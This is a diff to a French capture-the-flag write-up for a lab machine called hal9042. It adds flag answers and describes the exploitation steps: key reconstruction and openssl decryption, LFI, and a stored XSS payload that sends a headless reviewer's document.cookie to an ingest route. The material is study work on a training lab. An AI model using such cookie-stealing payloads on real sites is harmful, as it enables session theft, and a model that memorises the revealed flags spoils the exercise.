@@ -16,7 +16,7 @@ Toutefois on a une visu de l'escalade a realiser dans la description de l'applia
 |   2   | paco        | 🔐  |   ✅  [Clic](./write_up_3.md#b-prendre-le-controle-sur-paco)|
 |   3   | wil         | 🕵️  |   ✅  [Clic](./write_up_3.md#c-prendre-le-controle-sur-wil)|
 |   4   | sophie      | 🧠  |   ✅  [Clic](./write_up_3.md#d-prendre-le-controle-sur-sophie)|
-|   5   | ol          | 🛡️  |   ❌  |
+|   5   | ol          | 🛡️  |   ✅  [Clic](./write_up_3.md#e-prendre-le-controle-sur-ol)|
 |   6   | root        | 👑  |   ❌  |
 |*bonus*| xavier      |     |   ❌  |
 
@@ -59,8 +59,8 @@ Le script d'encryption de `paco` : `encrypt.py` nous explique qu'il nous faudra 
 |--------|--------------------------------------------------|
 |   1    | FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}      |
 |   2    | FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}                 |
-|   3    |                                                  |
-|   4    |                                                  |
+|   3    | FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}             |
+|   4    | FLAG{h4l_r3v13ws_3v3ry_4pp34l}                   |
 |   5    |                                                  |
 |   6    |                                                  |
 |   7    |                                                  |
@@ -68,7 +68,7 @@ Le script d'encryption de `paco` : `encrypt.py` nous explique qu'il nous faudra 
 |   9    |                                                  |
 |   10   |                                                  |
 
-1. **FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}**  
+#### #1 **FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}**  
 
 En utilisant la SSTI sur `/evaluate` avec les privileges`/var/www/hal9042` : 
 ```bash
@@ -99,7 +99,7 @@ Did you really think it would be that easy?
 
 Le resultat est le meme sur `http://10.0.2.2:5042/flag.txt`
 
-2. **FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}**
+#### #2 **FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}**
 > [!NOTE]
 > La decouverte de ce flag est detaillee dans le [LOGBOOK](../utils/LOG_BOOK.md). Je serai plus succinct ici.  
 
@@ -109,7 +109,48 @@ Un indice nous indique que l'on peut retrouver des traces de `xavier` sous son i
 
 On retrouve un binaire `/var/backups/xbackup`, si on le cat, un flag apparait dans le fichier : `FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}`.  
 
-Les details sur une fausse piste peuvent etre trouves dans le [LOGBOOK](../utils/LOG_BOOK.md). J'ai utilise Ghidra, essaye de le reverse pour rien, c'etait pas fun, mais j'ai appris. T_T  
+Autrement, il est mentionne dans le sujet que de fausses pistes sont volontairement inserees nous faire perdre du temps, c'est ce qui s'est passe : 
+- Si on essaie de l'executer : 
+    - `usage: xbackup <src> <dest>`.
+    - `(deleted users leave traces. so do their tools.)`
+- **string du binaire** : on voit un `xavier-recovery-token`
+- `xavier-recovery-token` : c'est en fait une adresse stockee, en realite dans `.rodata`, qui contient en fait juste le flag. Pas de token de recuperation en realite.  
+
+#### #3 **FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}**
+
+- Contexte de decouverte : 
+    Au cours de l'user enumeration, j'ai trouve dans `/home/ol/rapport/` un fichier appelle `rapport_v1.md`. Dans ce rapport, on nous invite a utiliser les 4 fragments de cle pour pouvoir ouvrir le sealed report : `rapport_final.enc`.  
+    On fait a ce moment le lien entre le script `/home/paco/scripts/encrypt.py` et ce rapport.
+
+- Dechiffrement de `rapport_final.enc`
+    Le fichier est chiffre en `AES-256-ECB`. Apres reconstitution de la cle, le fichier peut etre dechiffre afin de recuperer le rapport en clair.
+    Pour reconstituer la cle, `encrypt.py` nous invite a recuperer les [4 fragments](./write_up_3.md#recuperation-des-key_part). Une fois ces fragments en notre possession, on peut utiliser le programme pour recuperer la cle `AES-256-CB` : 
+    ```bash
+    paco@hal9042:~/scripts$ python3 encrypt.py 'M0ul1n3tt3' '847_4n0m4l13s' 'S0ph13_J14' 'uid1337'
+    380f5c29228093385507c1a9e351610a9144105e358e35abb8539250c033b44e
+    ```
+
+- Lecture du rapport et obtention du flag :
+    On reprend la commande `open_report` dans le script : `openssl enc -d -K <notre cle> -in /home/ol/rapport/rapport_final.enc -out rapport_final.txt`.
+    
+    Dans ce rapport on decouvre le flag : `FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}`
+
+#### #4 **FLAG{h4l_r3v13ws_3v3ry_4pp34l}**
+
+- Contexte de decouverte :
+    - On repere la route `appeal` dans le code source de l'application `app.py`.
+    - Confirmation de la faille grace a `./get_file.sh` (exploitation de la LFI).
+    La lecture de `/var/www/hal9042/templates/appeal_view.html` indique que le champ `reason` est rendu avec une filtre Jinja2 `| safe`, cad qu'il considere l'entree utilisateur comme tel et ne fait pas d'echappement HTML. **C'est une faille XSS** tres similaire a ce qu'on a pu rencontrer dans [Darkly](https://github.com/LaGuibole/darkly2.0).
+    - Identifiaction d'un canal d'exfiltration via `/api/ingest`. Cette route accepte n'importe quel type de donne via le QueryParam `?c=`
+    - Process visiteur : `ps aux | grep halrev` revele que `halrev` fait tourner un script Python `reviewer.py` qui pilote `Playwright + Chromium` en headless, donc un veritable navigateur qui execute du JS.
+
+- Exploitation : 
+    - `project=` : On peut y mettre ce qu'on veut, pas si important
+    - `reason=` : `<script>fecth('/api/ingest?c='+encodeURIComponent(document.cookie))</script>`
+    - La visite de `halrev` sur `/api/appeal/<id>` fire l'execution du code malveillant et log dans `/api/ingest` les 50 dernieres reviews.
+
+- Recuperation :
+    - `curl http://10.0.2.2:5042/api/ingest` = `hal_session=hal-reviewer-7e3f1a; flag=FLAG{h4l_r3v13ws_3v3ry_4pp34l}`
 
 ## KILL CHAIN
 
@@ -319,7 +360,7 @@ sophie@hal9042:/home/ol/scripts$ getent group evalops
 evalops:x:1001:wil
 ```
 
-4. Le pivot apparait donc clairement, il faut modifier le script `check.sh` depuis les privileges de `wil`, en essayant par exemple de cat la `.key_part` qui n'est `rw` seulement pour `ol`. Cela permettrait de confirmer l'escalation.
+4. Le pivot apparait donc clairement, il faut modifier le script `check.sh` depuis les privileges de `wil`, en essayant par exemple de cat la `.key_part` qui est `rw` seulement pour `ol`. Cela permettrait de confirmer l'escalation.
 
 5. **Realisation**  
 - Modification du script en append :
